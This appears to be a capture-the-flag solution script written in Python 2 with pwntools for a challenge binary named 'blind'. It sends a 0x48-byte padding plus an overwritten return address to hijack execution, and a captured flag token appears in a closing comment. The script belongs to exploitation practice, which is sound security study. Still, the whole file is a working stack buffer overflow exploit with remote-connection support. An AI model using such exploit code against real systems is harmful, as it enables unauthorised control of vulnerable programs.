#!/usr/bin/env python2

from pwn import *

def start():
    prog  = "./blind"
    ip   = "plsdonthaq.me"
    port = 2002

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()

payload = b"A" * 0x48
payload += p32(0x80484d6)
p.sendlineafter("jump", payload)

p.interactive()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1ibGluZCIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiMjA5YzZiZWItNmI4MS00NjljLTliYjMtYTgxODE5MWE2ZGM4In0.g9Qcxi_IMooHRoZffc7kr8zB0_4gZyqhCootzMcvZic}